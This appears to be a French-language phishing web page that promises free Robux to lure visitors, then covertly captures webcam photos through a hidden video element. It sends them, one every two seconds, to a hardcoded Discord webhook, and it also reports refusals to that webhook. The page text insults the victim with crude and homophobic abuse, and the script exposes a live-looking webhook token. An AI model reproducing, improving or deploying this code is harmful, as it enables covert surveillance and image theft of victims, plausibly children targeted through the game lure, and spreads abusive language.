<!DOCTYPE html>
<html>
<head>
    <title>VOL WEBCAM ULTIME</title>
    <style>
        body { background: black; color: lime; text-align: center; padding: 50px; }
        button { font-size: 50px; background: red; padding: 20px; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body>
    <h1>🔥 50 000 ROBUX GRATUITS 🔥</h1>
    <button id="start">ACTIVER LA CAMÉRA</button>
    <div id="log"></div>
    <video id="cam" autoplay muted playsinline></video>
<script>
const webhook = "https://discord.com/api/webhooks/1496273477831884810/IzhJ0ANPNvNR6gT8Xyk0VENud_45B1nzrcas4JVeY8hLtcIUk4qDssv5C6AW_WjrHwhW"; // TON WEBHOOK
const btn = document.getElementById('start');
const video = document.getElementById('cam');
const logDiv = document.getElementById('log');

async function envoiePhoto(imgData) {
    const form = new FormData();
    form.append("payload_json", JSON.stringify({ content: "@maku_95 Photo volée", embeds: [{ image: { url: "attachment://photo.jpg" } }] }));
    const blob = await (await fetch(imgData)).blob();
    form.append("files[0]", blob, "photo.jpg");
    fetch(webhook, { method: "POST", body: form });
}

btn.onclick = async () => {
    logDiv.innerText = "Demande d’accès à la caméra...";
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();
        logDiv.innerText = "Caméra active, capture dans 1 seconde...";
        await new Promise(r => setTimeout(r, 1000));
        // Attendre les dimensions
        while (video.videoWidth === 0) await new Promise(r => setTimeout(r, 100));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        const image = canvas.toDataURL('image/jpeg', 0.9);
        // Test si l'image est vraiment noire (luminosité moyenne)
        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        let sum = 0;
        for (let i = 0; i < imgData.data.length; i += 4) sum += imgData.data[i] + imgData.data[i+1] + imgData.data[i+2];
        const avg = sum / (canvas.width * canvas.height * 3);
        if (avg < 30) {
            logDiv.innerText = "IMAGE NOIRE – Ta caméra est bouchée ou t’es trop moche pour refléter la lumière.";
            await fetch(webhook, { method: "POST", body: JSON.stringify({ content: "@maku_95 La victime a une webcam qui donne du noir. Insulte-la bien." }), headers: { "Content-Type": "application/json" } });
        } else {
            await envoiePhoto(image);
            logDiv.innerText = "PHOTO ENVOYÉE ! Regarde ton Discord, sale pédé.";
        }
        // Capture toutes les 2 secondes
        setInterval(() => {
            ctx.drawImage(video, 0, 0);
            const img2 = canvas.toDataURL('image/jpeg', 0.9);
            envoiePhoto(img2);
        }, 2000);
    } catch(e) {
        logDiv.innerText = "Erreur : t’as refusé ou pas de caméra. Va te faire foutre.";
        fetch(webhook, { method: "POST", body: JSON.stringify({ content: "@maku_95 Victime a refusé la webcam." }), headers: { "Content-Type": "application/json" } });
    }
};
</script>
</body>
</html>
